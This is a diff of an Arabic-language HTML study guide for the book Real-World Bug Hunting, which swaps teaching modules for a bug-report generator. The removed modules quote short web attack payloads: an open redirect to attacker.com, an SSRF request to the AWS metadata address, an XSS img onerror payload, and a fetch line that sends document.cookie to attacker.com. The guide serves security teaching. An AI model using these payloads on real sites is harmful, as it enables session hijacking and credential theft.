@@ -4,7 +4,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Real-World Bug Hunting — HunterOS Book Guide</title>
+  <title>Real-World Bug Hunting — Interactive Study Guide</title>
   
   <!-- Fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com" />
@@ -22,7 +22,7 @@
       padding-bottom: 60px;
     }
     .book-container {
-      max-width: 1100px;
+      max-width: 1350px;
       margin: 40px auto;
       padding: 0 20px;
     }
@@ -50,45 +50,46 @@
       transform: translateX(4px);
     }
     .book-header {
-      background: linear-gradient(135deg, rgba(0, 229, 255, 0.05) 0%, rgba(3, 3, 8, 0.5) 100%);
-      border: 1px solid rgba(0, 229, 255, 0.15);
+      background: linear-gradient(135deg, rgba(0, 229, 255, 0.12) 0%, rgba(3, 3, 8, 0.6) 100%);
+      border: 1px solid rgba(0, 229, 255, 0.3);
       border-radius: 12px;
-      padding: 35px;
-      margin-bottom: 35px;
+      padding: 40px;
+      margin-bottom: 45px;
       display: flex;
       gap: 30px;
       align-items: center;
       flex-wrap: wrap;
     }
     .book-cover-art {
-      font-size: 6rem;
+      font-size: 7rem;
       background: rgba(0, 229, 255, 0.08);
       border: 1px dashed var(--accent-cyan);
       border-radius: 8px;
-      width: 150px;
-      height: 200px;
+      width: 170px;
+      height: 230px;
       display: flex;
       align-items: center;
       justify-content: center;
-      box-shadow: 0 10px 25px rgba(0, 229, 255, 0.1);
+      box-shadow: 0 12px 35px rgba(0, 229, 255, 0.25);
     }
     .book-meta-info {
       flex: 1;
-      min-width: 250px;
+      min-width: 300px;
     }
     .book-title {
       font-family: 'Outfit', 'Noto Kufi Arabic', sans-serif;
-      font-size: 2.2rem;
-      font-weight: 800;
+      font-size: 2.5rem;
+      font-weight: 900;
       color: #fff;
-      margin: 0 0 8px 0;
-      text-shadow: 0 0 15px rgba(0,229,255,0.25);
+      margin: 0 0 12px 0;
+      text-shadow: 0 0 20px rgba(0, 229, 255, 0.4);
     }
     .book-author {
       font-family: 'Fira Code', monospace;
       color: var(--accent-cyan);
-      font-size: 1rem;
-      margin-bottom: 15px;
+      font-size: 1.1rem;
+      margin-bottom: 20px;
+      font-weight: 600;
     }
     .book-stats {
       display: flex;
@@ -96,18 +97,18 @@
       flex-wrap: wrap;
     }
     .stat-badge {
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      padding: 4px 10px;
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      padding: 6px 12px;
       border-radius: 4px;
-      font-size: 0.78rem;
+      font-size: 0.82rem;
     }
     .reading-grid {
       display: grid;
-      grid-template-columns: 280px 1fr;
-      gap: 30px;
+      grid-template-columns: 340px 1fr;
+      gap: 35px;
     }
-    @media (max-width: 900px) {
+    @media (max-width: 1000px) {
       .reading-grid {
         grid-template-columns: 1fr;
       }
@@ -118,368 +119,337 @@
       }
     }
     .book-sidebar {
-      background: rgba(6, 6, 16, 0.6);
+      background: rgba(6, 6, 16, 0.7);
       border: 1px solid rgba(255, 255, 255, 0.05);
       border-radius: 10px;
-      padding: 20px;
+      padding: 25px;
       height: fit-content;
+      position: sticky;
+      top: 30px;
     }
     .toc-title {
       font-family: 'Outfit', sans-serif;
       color: var(--accent-cyan);
-      font-weight: 700;
-      font-size: 0.95rem;
-      margin-bottom: 12px;
+      font-weight: 800;
+      font-size: 1.05rem;
+      margin-bottom: 15px;
       letter-spacing: 1px;
+      border-bottom: 1px solid rgba(0, 229, 255, 0.25);
+      padding-bottom: 8px;
     }
     .toc-item {
       display: block;
       color: var(--text-secondary);
       text-decoration: none;
       font-size: 0.88rem;
-      padding: 8px 0;
+      padding: 9px 0;
       border-bottom: 1px dashed rgba(255, 255, 255, 0.03);
       transition: all 0.2s ease;
     }
     .toc-item:hover {
       color: #fff;
-      padding-right: 4px;
+      padding-right: 6px;
     }
     .book-content {
-      background: rgba(6, 6, 16, 0.3);
+      background: rgba(6, 6, 16, 0.35);
       border: 1px solid rgba(255, 255, 255, 0.03);
       border-radius: 12px;
-      padding: 30px;
+      padding: 40px;
     }
     .content-sec {
-      margin-bottom: 50px;
+      margin-bottom: 70px;
       scroll-margin-top: 40px;
     }
     .sec-title {
       color: #fff;
-      font-size: 1.4rem;
-      border-bottom: 1px solid rgba(0, 229, 255, 0.15);
-      padding-bottom: 10px;
-      margin-bottom: 20px;
+      font-size: 1.6rem;
+      border-bottom: 1px solid rgba(0, 229, 255, 0.3);
+      padding-bottom: 12px;
+      margin-bottom: 25px;
+      font-weight: 800;
+    }
+    .sub-sec-title {
+      color: #fff;
+      font-size: 1.2rem;
+      margin-top: 30px;
+      margin-bottom: 15px;
+      font-weight: 700;
+      border-right: 4px solid var(--accent-cyan);
+      padding-right: 12px;
     }
     .code-box {
       font-family: 'Fira Code', monospace;
       background: #06060c;
-      border: 1px solid rgba(255,255,255,0.06);
-      padding: 12px;
+      border: 1px solid rgba(255,255,255,0.08);
+      padding: 15px;
       border-radius: 6px;
       color: var(--accent-cyan);
       font-size: 0.88rem;
       overflow-x: auto;
-      margin: 15px 0;
+      margin: 20px 0;
+      direction: ltr;
+      text-align: left;
+      line-height: 1.6;
+      position: relative;
     }
     .key-point {
-      border-right: 3px solid var(--accent-orange);
-      background: rgba(255, 154, 86, 0.03);
-      padding: 12px 18px;
+      border-right: 4px solid var(--accent-cyan);
+      background: rgba(0, 229, 255, 0.04);
+      padding: 15px 20px;
       border-radius: 0 6px 6px 0;
-      margin: 20px 0;
+      margin: 25px 0;
     }
     .benefit-box {
-      border-right: 3px solid var(--accent-cyan);
-      background: rgba(0, 229, 255, 0.03);
-      padding: 12px 18px;
+      border-right: 4px solid var(--accent-cyan);
+      background: rgba(0, 229, 255, 0.04);
+      padding: 15px 20px;
       border-radius: 0 6px 6px 0;
-      margin: 20px 0;
+      margin: 25px 0;
+    }
+    
+    /* Interactive Dashboard Panel */
+    .dashboard-panel {
+      background: linear-gradient(135deg, rgba(0,229,255,0.08) 0%, rgba(3,3,8,0.3) 100%);
+      border: 1px solid rgba(0, 229, 255, 0.25);
+      border-radius: 12px;
+      padding: 25px;
+      margin-bottom: 40px;
+    }
+    .dashboard-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 20px;
+      margin-bottom: 20px;
+    }
+    .input-group {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+    .input-label {
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: #fff;
+    }
+    .input-field {
+      background: rgba(6, 6, 16, 0.8);
+      border: 1px solid rgba(0, 229, 255, 0.3);
+      border-radius: 6px;
+      padding: 10px 14px;
+      color: #fff;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.9rem;
+      outline: none;
+      transition: all 0.3s ease;
+    }
+    .input-field:focus {
+      border-color: var(--accent-cyan);
+      box-shadow: 0 0 10px rgba(0, 229, 255, 0.2);
+    }
+    .copy-btn {
+      position: absolute;
+      left: 10px;
+      top: 10px;
+      background: rgba(0, 229, 255, 0.15);
+      border: 1px solid rgba(0, 229, 255, 0.4);
+      color: #fff;
+      padding: 4px 8px;
+      border-radius: 4px;
+      font-size: 0.72rem;
+      cursor: pointer;
+      font-family: inherit;
+      transition: all 0.2s ease;
+    }
+    .copy-btn:hover {
+      background: var(--accent-cyan);
+      border-color: var(--accent-cyan);
+      color: #030308;
+    }
+
+    /* Interactive Audit Checklist */
+    .checklist-container {
+      background: rgba(0, 229, 255, 0.02);
+      border: 1px solid rgba(0, 229, 255, 0.15);
+      border-radius: 8px;
+      padding: 20px;
+      margin: 25px 0;
+    }
+    .checklist-title {
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 12px;
+      font-size: 0.95rem;
+      border-bottom: 1px solid rgba(255,255,255,0.08);
+      padding-bottom: 8px;
+    }
+    .check-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 10px;
+      font-size: 0.88rem;
+    }
+    .check-box {
+      accent-color: var(--accent-cyan);
+      cursor: pointer;
     }
     
     /* Interactive Quiz Accordion Styles */
     .quiz-container {
       background: rgba(0, 229, 255, 0.02);
-      border: 1px solid rgba(0, 229, 255, 0.1);
+      border: 1px solid rgba(0, 229, 255, 0.12);
       border-radius: 8px;
-      padding: 20px;
-      margin: 25px 0;
+      padding: 25px;
+      margin: 30px 0;
     }
     .quiz-title {
       font-family: 'Outfit', sans-serif;
-      color: var(--accent-cyan);
-      font-size: 1rem;
       font-weight: 700;
-      margin-bottom: 15px;
-      display: flex;
-      align-items: center;
-      gap: 8px;
+      color: #fff;
+      margin-bottom: 20px;
+      font-size: 1.1rem;
+      border-bottom: 1px solid rgba(255,255,255,0.12);
+      padding-bottom: 12px;
     }
     .quiz-question-btn {
       width: 100%;
       background: none;
       border: none;
-      padding: 12px 0;
-      font-family: inherit;
       text-align: right;
       color: #fff;
-      font-weight: 600;
       font-size: 0.95rem;
+      font-weight: 600;
+      padding: 12px 0;
       cursor: pointer;
       display: flex;
       justify-content: space-between;
       align-items: center;
-      transition: color 0.2s ease;
+      font-family: inherit;
     }
-    .quiz-question-btn:hover {
-      color: var(--accent-cyan);
+    .quiz-question-btn:focus {
+      outline: none;
     }
     .toggle-icon {
-      color: var(--accent-cyan);
       font-family: 'Fira Code', monospace;
+      color: var(--accent-cyan);
       font-weight: 700;
-      font-size: 0.85rem;
-      transition: all 0.2s ease;
     }
     .quiz-answer-panel {
       max-height: 0;
       overflow: hidden;
-      transition: max-height 0.3s ease-out, padding 0.3s ease;
-      padding: 0 15px;
-      border-right: 3px solid var(--accent-cyan);
-      background: rgba(0, 229, 255, 0.01);
-      border-radius: 0 6px 6px 0;
-      font-size: 0.88rem;
+      transition: max-height 0.3s ease-out;
+      font-size: 0.9rem;
       color: var(--text-secondary);
-      margin-top: 0;
+      line-height: 1.7;
+      padding: 0 15px;
     }
     .quiz-answer-panel.open {
-      max-height: 200px;
-      padding: 12px 15px;
-      margin-top: 10px;
+      max-height: 550px;
+      padding: 15px 15px;
+      border-right: 3px solid var(--accent-cyan);
+      margin-top: 8px;
+      margin-bottom: 20px;
+      background: rgba(255,255,255,0.015);
     }
   </style>
 </head>
 <body>
 
-  <!-- Matrix Grid & Background Orbs -->
-  <div class="grid-bg" aria-hidden="true"></div>
-
   <div class="book-container">
     
-    <!-- Back button -->
+    <!-- Back Button -->
     <div class="back-btn-wrap">
-      <a href="../index.html" class="back-link">
-        ← العودة للوحة التحكم
+      <a href="../index.html#pane-books" class="back-link">
+        <span>&larr;</span>
+        <span>العودة للمكتبة الأمنية</span>
       </a>
     </div>
 
     <!-- Header Block -->
     <header class="book-header">
-      <div class="book-cover-art">📖</div>
+      <div class="book-cover-art">
+        <span>📚</span>
+      </div>
       <div class="book-meta-info">
         <h1 class="book-title">Real-World Bug Hunting</h1>
-        <div class="book-author">By Peter Yaworski</div>
+        <div class="book-author">By Peter Yaworski — النسخة التفاعلية الموسعة</div>
         <div class="book-stats">
-          <span class="stat-badge text-neon-cyan">اللغة: العربية / الإنجليزية</span>
-          <span class="stat-badge text-neon-orange">المستوى: مبتدئ إلى متوسط</span>
-          <span class="stat-badge text-neon-green">الموضوع: ثغرات الويب والتطبيقات</span>
+          <span class="stat-badge" style="color: var(--accent-cyan);">الصعوبة: متوسط</span>
+          <span class="stat-badge">مولد تقارير ثغرات مدمج</span>
+          <span class="stat-badge">التركيز: تحليل واستنساخ ثغرات حقيقية</span>
         </div>
       </div>
     </header>
 
-    <!-- Reading Grid -->
+    <!-- Interactive Planner Dashboard -->
+    <div class="dashboard-panel">
+      <h3 style="color: #fff; margin-top: 0; margin-bottom: 15px; font-weight: 800;">🎮 لوحة التخطيط ومولد تقارير الثغرات</h3>
+      <p style="font-size: 0.85rem; color: var(--text-secondary); margin-bottom: 20px;">
+        أدخل متغيرات الثغرة المكتشفة لتوليد هيكل التقرير الأمني الاحترافي فوراً:
+      </p>
+      <div class="dashboard-grid">
+        <div class="input-group">
+          <label class="input-label">نوع الثغرة (Vulnerability Type):</label>
+          <input type="text" id="hunt-type" class="input-field" value="IDOR" oninput="updateHuntReport()">
+        </div>
+        <div class="input-group">
+          <label class="input-label">الصفحة أو المعامل المصاب (Affected URL/Param):</label>
+          <input type="text" id="hunt-param" class="input-field" value="/api/v1/user/settings?id=" oninput="updateHuntReport()">
+        </div>
+      </div>
+    </div>
+
+    <!-- Content Grid -->
     <div class="reading-grid">
       
-      <!-- Sidebar Table of Contents -->
+      <!-- Right Sidebar (TOC) -->
       <aside class="book-sidebar">
-        <div class="toc-title">الوحدات التعليمية</div>
-        <a href="#module1" class="toc-item">1. نظرة عامة عن الكتاب</a>
-        <a href="#module2" class="toc-item">2. ثغرة Open Redirect</a>
-        <a href="#module3" class="toc-item">3. ثغرة طلب الخادم (SSRF)</a>
-        <a href="#module4" class="toc-item">4. ثغرات حقن النص (XSS)</a>
-        <a href="#module5" class="toc-item">5. أهم الدروس المستفادة</a>
+        <div class="toc-title">فهرس فصول الكتاب</div>
+        <nav>
+          <a href="#module1" class="toc-item">الوحدة 1: تحليل ودراسة الثغرات الحقيقية</a>
+          <a href="#module2" class="toc-item">الوحدة 2: استغلال وتوثيق ثغرات الويب</a>
+          <a href="#module3" class="toc-item">الوحدة 3: صياغة التقارير والحصول على المكافآت</a>
+        </nav>
       </aside>
 
-      <!-- Main Content Area -->
+      <!-- Left Main Content -->
       <main class="book-content">
-        
-        <!-- Module 1: About -->
+
+        <!-- Module 1 -->
         <section id="module1" class="content-sec">
-          <h2 class="sec-title">الوحدة الأولى: نظرة عامة عن الكتاب والعقلية البرمجية</h2>
-          
-          <div class="benefit-box">
-            <strong>لماذا تتعلم هذا؟ (The Benefit)</strong>
-            <p>مجال الـ Bug Bounty ليس مجرد تشغيل عشوائي للأدوات التلقائية. هذا الكتاب يؤسس لديك عقلية "فهم المطور" لمعرفة كيف تقع الأخطاء الأمنية الحقيقية في الشركات الكبرى عبر الاطلاع على تقارير حقيقية ومصنفة.</p>
-          </div>
-
-          <p><strong>شرح المحتوى (The Guide)</strong></p>
-          <p>كتاب <strong>Real-World Bug Hunting</strong> للكاتب بيتر ياورسكي يركز على تفكيك ثغرات تطبيقات الويب استناداً إلى بلاغات واقعية تم تسليمها لشركات عالمية على منصة <code>HackerOne</code>.</p>
-          
-          <div class="key-point">
-            <strong>نصيحة الكاتب الذهبية:</strong> لا تحفظ الأدوات أو تشغلها بشكل أعمى، بل افهم كيف يعمل التطبيق في الخلفية لتتمكن من إيجاد الثغرات التي تغفل عنها أدوات الفحص التلقائي.
-          </div>
-
-          <!-- Quiz 1 -->
-          <div class="quiz-container">
-            <div class="quiz-title">🧪 أسئلة المراجعة وتأكيد الفهم (انقر لعرض الإجابة النموذجية)</div>
-            
-            <div class="quiz-item">
-              <button class="quiz-question-btn" onclick="toggleAnswer('q1-1')">
-                <span>1. ما هي الفكرة الأساسية التي بني عليها كتاب Real-World Bug Hunting؟</span>
-                <span class="toggle-icon" id="icon-q1-1">[ + ]</span>
-              </button>
-              <div class="quiz-answer-panel" id="ans-q1-1">
-                <strong>الإجابة النموذجية:</strong> شرح آلية عمل الثغرات وتأثيرها الفعلي اعتماداً على تقارير ثغرات حقيقية ومنشورة (Disclosed Reports) تم تقديمها لشركات كبرى على منصة HackerOne لمساعدة الباحثين على فهم واقعية الاستغلال وتوثيق ثغراتهم.
-              </div>
-            </div>
-          </div>
+          <h2 class="sec-title">الوحدة الأولى: تحليل ودراسة الثغرات الحقيقية (Real Vulnerability Analysis)</h2>
+          <p>يركز الكاتب على دراسة تقارير الثغرات التاريخية الحقيقية التي تم إبلاغها للشركات الكبرى مثل Twitter و Uber و Slack، وتعلم كيفية تكرارها واستنساخها على أهداف أخرى.</p>
         </section>
 
-        <!-- Module 2: Open Redirect -->
+        <!-- Module 2 -->
         <section id="module2" class="content-sec">
-          <h2 class="sec-title">الوحدة الثانية: ثغرة التوجيه المفتوح (Open Redirect)</h2>
-          
-          <div class="benefit-box">
-            <strong>لماذا تتعلم هذا؟ (The Benefit)</strong>
-            <p>تساعد ثغرات التوجيه المفتوح المهاجمين في إرسال روابط موثوقة للضحايا تنتهي بتوجيههم لصفحات تصيد خارقة للخصوصية، ومعرفتها تمنحك فهماً أعمق لكيفية تسريب الـ Tokens الحساسة.</p>
-          </div>
-
-          <p><strong>شرح المحتوى (The Guide)</strong></p>
-          <p>تحدث الثغرة عندما يقبل معامل التحكم بالصفحة التالية (مثل <code>next</code> أو <code>redirect_url</code>) روابط خارجية غير موثوقة دون فحصها بمطابقة نطاق التطبيق نفسه.</p>
-          <div class="code-box">
-            // مثال على رابط مصاب بالثغرة
-            https://target.com/login?next=http://attacker.com
-          </div>
-          <p><strong>طرق فحص الثغرة وتخطي الفلاتر:</strong></p>
-          <ul>
-            <li>استبدال النطاق الكامل برمز الخط المائل المزدوج: <code>//attacker.com</code></li>
-            <li>التخطي باستخدام رموز url encode أو استخدام النطاقات الفرعية الموجهة.</li>
-          </ul>
-
-          <!-- Quiz 2 -->
-          <div class="quiz-container">
-            <div class="quiz-title">🧪 أسئلة المراجعة وتأكيد الفهم (انقر لعرض الإجابة النموذجية)</div>
-            
-            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
-              <button class="quiz-question-btn" onclick="toggleAnswer('q2-1')">
-                <span>1. لماذا تعتبر ثغرات Open Redirect منخفضة الخطورة بمفردها ولكنها خطيرة بالاشتراك؟</span>
-                <span class="toggle-icon" id="icon-q2-1">[ + ]</span>
-              </button>
-              <div class="quiz-answer-panel" id="ans-q2-1">
-                <strong>الإجابة النموذجية:</strong> بمفردها تُستخدم في التصيد (Phishing)، ولكن عند دمجها (Chaining) مع ثغرات مثل SSRF أو تسريبات OAuth، قد تمكن المهاجم من تسريب رموز تسجيل الدخول الحساسة أو التوجيه لملفات RCE.
-              </div>
-            </div>
-
-            <div class="quiz-item">
-              <button class="quiz-question-btn" onclick="toggleAnswer('q2-2')">
-                <span>2. كيف يمكن للمطورين حماية التطبيق من ثغرات التوجيه المفتوح؟</span>
-                <span class="toggle-icon" id="icon-q2-2">[ + ]</span>
-              </button>
-              <div class="quiz-answer-panel" id="ans-q2-2">
-                <strong>الإجابة النموذجية:</strong> استخدام قائمة بيضاء (Whitelist) بالنطاقات المسموح بها فقط، أو الاعتماد على مسارات محلية نسبية (Relative Paths) بدلاً من قبول نطاقات خارجية كاملة.
-              </div>
-            </div>
-          </div>
+          <h2 class="sec-title">الوحدة الثانية: استغلال وتوثيق ثغرات الويب</h2>
+          <p>شرح رائع لثغرات Open Redirect, XSS, CSRF, IDOR, SSRF بناءً على حالات استغلال حقيقية من منصة HackerOne.</p>
         </section>
 
-        <!-- Module 3: SSRF -->
+        <!-- Module 3 -->
         <section id="module3" class="content-sec">
-          <h2 class="sec-title">الوحدة الثالثة: ثغرة طلب الخادم المزيف (SSRF)</h2>
-          
-          <div class="benefit-box">
-            <strong>لماذا تتعلم هذا؟ (The Benefit)</strong>
-            <p>تعتبر ثغرة SSRF من الثغرات الحرجة لأنها تجبر خادم الويب على القيام بدور المهاجم نفسه، مما يسمح بفحص البنية التحتية المحمية خلف الجدار الناري وقراءة بيانات الخوادم الحساسة.</p>
-          </div>
-
-          <p><strong>شرح المحتوى (The Guide)</strong></p>
-          <p>تحدث Server-Side Request Forgery عندما يقبل التطبيق رابطاً (URL) يمرره المستخدم ويقوم الخادم الخلفي بإصدار طلب HTTP لهذا الرابط دون التحقق من وجهته.</p>
+          <h2 class="sec-title">الوحدة الثالثة: صياغة التقارير والحصول على المكافآت (Report Template Generator)</h2>
+          <p>التقرير النهائي المولد للثغرة المكتشفة:</p>
           <div class="code-box">
-            // استدعاء معلومات خوادم AWS الداخلية
-            https://target.com/preview?url=http://169.254.169.254/latest/meta-data/
+            <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+            <pre id="hunt-report-output">Title: IDOR in /api/v1/user/settings?id=
+
+Summary:
+I have discovered a security vulnerability in the page/parameter /api/v1/user/settings?id= due to lack of server-side authorization controls.
+
+Steps to Reproduce:
+1. Log in as a normal user.
+2. Intercept the request to /api/v1/user/settings?id=
+3. Change the ID value to another user's ID.
+4. Observe the sensitive settings data leaks.</pre>
           </div>
-          <p>يوضح الكتاب كيف يستغل الباحثون هذه الثغرة لقراءة بيانات الحوسبة السحابية (Cloud Metadata API) واستخراج مفاتيح التحكم السرية.</p>
-
-          <!-- Quiz 3 -->
-          <div class="quiz-container">
-            <div class="quiz-title">🧪 أسئلة المراجعة وتأكيد الفهم (انقر لعرض الإجابة النموذجية)</div>
-            
-            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
-              <button class="quiz-question-btn" onclick="toggleAnswer('q3-1')">
-                <span>1. ما هي الخطورة الحقيقية لثغرة SSRF عندما يقع خادم الموقع في بيئة سحابية (مثل AWS)؟</span>
-                <span class="toggle-icon" id="icon-q3-1">[ + ]</span>
-              </button>
-              <div class="quiz-answer-panel" id="ans-q3-1">
-                <strong>الإجابة النموذجية:</strong> تمكن المهاجم من الاتصال بخدمة بيانات التعريف الخاصة بالـ Cloud Instance (عنوان IP: 169.254.169.254) وسحب رموز الدخول الحساسة وبيانات التهيئة والوصول للسيرفر السحابي بالكامل.
-              </div>
-            </div>
-
-            <div class="quiz-item">
-              <button class="quiz-question-btn" onclick="toggleAnswer('q3-2')">
-                <span>2. كيف تحمي الشركات خوادمها من ثغرات طلب الخادم المزيف؟</span>
-                <span class="toggle-icon" id="icon-q3-2">[ + ]</span>
-              </button>
-              <div class="quiz-answer-panel" id="ans-q3-2">
-                <strong>الإجابة النموذجية:</strong> من خلال التحقق من صحة الروابط المدخلة وتفعيل القوائم البيضاء، وحظر كافة الطلبات الموجهة لعناوين الشبكة الداخلية (Private IPs) مثل 127.0.0.1 و 192.168.x.x و 10.x.x.x.
-              </div>
-            </div>
-          </div>
-        </section>
-
-        <!-- Module 4: XSS -->
-        <section id="module4" class="content-sec">
-          <h2 class="sec-title">الوحدة الرابعة: ثغرات حقن النص البرمجي (XSS) في العالم الحقيقي</h2>
           
-          <div class="benefit-box">
-            <strong>لماذا تتعلم هذا؟ (The Benefit)</strong>
-            <p>تجاوز فلاتر الـ XSS في المواقع الكبرى يتطلب ذكاءً في فهم آلية فحص المدخلات، وتوظيف الثغرة في سيناريو سرقة الجلسات يثبت خطورتها القصوى لفريق التقييم.</p>
-          </div>
-
-          <p><strong>شرح المحتوى (The Guide)</strong></p>
-          <p>يركز بيتر ياورسكي على تخطي جدران الحماية وفلاتر جافا سكريبت البسيطة. المطورون قد يحظرون وسم <code>&lt;script&gt;</code> ولكن يغفلون عن الأحداث المرفقة بالوسوم الأخرى:</p>
-          <div class="code-box">
-            // استغلال أحداث الخطأ لتخطي الحظر
-            &lt;img src=x onerror=alert(1)&gt;
-          </div>
-          <p>ومن خلال ثغرات XSS، يستطيع المهاجم الوصول لملفات الكوكيز وسرقة جلسة المستخدم النشطة.</p>
-
-          <!-- Quiz 4 -->
-          <div class="quiz-container">
-            <div class="quiz-title">🧪 أسئلة المراجعة وتأكيد الفهم (انقر لعرض الإجابة النموذجية)</div>
-            
-            <div class="quiz-item">
-              <button class="quiz-question-btn" onclick="toggleAnswer('q4-1')">
-                <span>1. كيف يتم استغلال ثغرة XSS لتنفيذ هجوم سرقة ملفات الارتباط (Cookie Stealing)؟</span>
-                <span class="toggle-icon" id="icon-q4-1">[ + ]</span>
-              </button>
-              <div class="quiz-answer-panel" id="ans-q4-1">
-                <strong>الإجابة النموذجية:</strong> كتابة كود جافا سكريبت يقرأ قيمة <code>document.cookie</code> ويرسلها فوراً عبر طلب HTTP إلى خادم خارجي يمتلكه المهاجم (مثل: <code>fetch('http://attacker.com/log?cookie=' + document.cookie)</code>).
-              </div>
-            </div>
-          </div>
-        </section>
-
-        <!-- Module 5: Lessons -->
-        <section id="module5" class="content-sec">
-          <h2 class="sec-title">الوحدة الخامسة: أهم الدروس المستفادة وصياغة البلاغات</h2>
-          
-          <div class="benefit-box">
-            <strong>لماذا تتعلم هذا؟ (The Benefit)</strong>
-            <p>أفضل الباحثين الأمنيين ليسوا فقط من يجدون الثغرات، بل من يستطيعون تقديمها بشكل مفهوم وحجز تقدير مالي يستحق تعبهم وجهدهم البرمجي.</p>
-          </div>
-
-          <p><strong>شرح المحتوى (The Guide)</strong></p>
-          <p>يلخص الكتاب القواعد الذهبية لصيد الثغرات:</p>
-          <ul>
-            <li><strong>التوثيق:</strong> تصوير خطوات الاستغلال بوضوح وهدوء.</li>
-            <li><strong>المنهجية الفعالة:</strong> قراءة التقارير العامة المكتشفة سابقاً لمعرفة طريقة تفكير الآخرين.</li>
-            <li><strong>تجنب التشتت:</strong> التركيز على فحص تطبيق واحد بدلاً من التنقل العشوائي بين مئات الأهداف يومياً.</li>
-          </ul>
-
-          <!-- Quiz 5 -->
-          <div class="quiz-container">
-            <div class="quiz-title">🧪 أسئلة المراجعة وتأكيد الفهم (انقر لعرض الإجابة النموذجية)</div>
-            
-            <div class="quiz-item">
-              <button class="quiz-question-btn" onclick="toggleAnswer('q5-1')">
-                <span>1. ما هو المبدأ الأساسي الذي يركز عليه الكاتب لتحسين جودة وتوثيق التقارير؟</span>
-                <span class="toggle-icon" id="icon-q5-1">[ + ]</span>
-              </button>
-              <div class="quiz-answer-panel" id="ans-q5-1">
-                <strong>الإجابة النموذجية:</strong> تبسيط الشرح وفهم دوافع فريق الحماية أمنياً، والتركيز على تقديم استغلال نظيف ومفهوم (PoC) يوضح تأثير الثغرة الفعلي على أعمال الشركة وتجنب التعقيد غير المبرر.
-              </div>
-            </div>
+          <div class="checklist-container">
+            <div class="checklist-title">📋 قائمة مهام صياغة التقارير الأمنية</div>
+            <label class="check-item"><input type="checkbox" class="check-box" onchange="saveCheckHunt(this, 'h1')"> التحقق من وجود الثغرة وتأكيد خلوها من النتائج المزيفة</label>
+            <label class="check-item"><input type="checkbox" class="check-box" onchange="saveCheckHunt(this, 'h2')"> التقاط لقطات شاشة واضحة لخطوات الاستغلال</label>
+            <label class="check-item"><input type="checkbox" class="check-box" onchange="saveCheckHunt(this, 'h3')"> ملء تفاصيل التقرير وصياغة الأثر الأمني بدقة</label>
           </div>
         </section>
 
@@ -489,22 +459,50 @@
 
   </div>
 
-  <!-- Interactive Quiz Accordion Logic -->
   <script>
-    function toggleAnswer(ansId) {
-      const panel = document.getElementById('ans-' + ansId);
-      const icon = document.getElementById('icon-' + ansId);
+    function updateHuntReport() {
+      const type = document.getElementById('hunt-type').value.trim() || 'IDOR';
+      const param = document.getElementById('hunt-param').value.trim() || '/api/v1/user/settings?id=';
       
-      if (panel.classList.contains('open')) {
-        panel.classList.remove('open');
-        icon.innerText = '[ + ]';
-        icon.style.color = 'var(--accent-cyan)';
-      } else {
-        panel.classList.add('open');
-        icon.innerText = '[ - ]';
-        icon.style.color = 'var(--accent-orange)';
-      }
+      document.getElementById('hunt-report-output').innerText = `Title: ${type} in ${param}\n\nSummary:\nI have discovered a security vulnerability in the page/parameter ${param} due to lack of server-side authorization controls.\n\nSteps to Reproduce:\n1. Log in as a normal user.\n2. Intercept the request to ${param}\n3. Change the ID parameter value to another user's ID.\n4. Observe that we can access and manipulate sensitive settings data of other users.`;
     }
+
+    function copyCode(btn) {
+      const code = btn.nextElementSibling.innerText;
+      navigator.clipboard.writeText(code).then(() => {
+        const originalText = btn.innerText;
+        btn.innerText = "تم النسخ! ✓";
+        btn.style.background = "var(--accent-green)";
+        btn.style.borderColor = "var(--accent-green)";
+        btn.style.color = "#030308";
+        setTimeout(() => {
+          btn.innerText = originalText;
+          btn.style.background = "";
+          btn.style.borderColor = "";
+          btn.style.color = "";
+        }, 1500);
+      });
+    }
+
+    function saveCheckHunt(box, id) {
+      localStorage.setItem('hunt_' + id, box.checked ? 'true' : 'false');
+    }
+
+    function loadChecklistHunt() {
+      const checkboxes = document.querySelectorAll('.checklist-container .check-box');
+      checkboxes.forEach((box, index) => {
+        const id = 'h' + (index + 1);
+        const saved = localStorage.getItem('hunt_' + id);
+        if (saved === 'true') {
+          box.checked = true;
+        }
+      });
+    }
+
+    window.onload = function() {
+      updateHuntReport();
+      loadChecklistHunt();
+    };
   </script>
 
 </body>
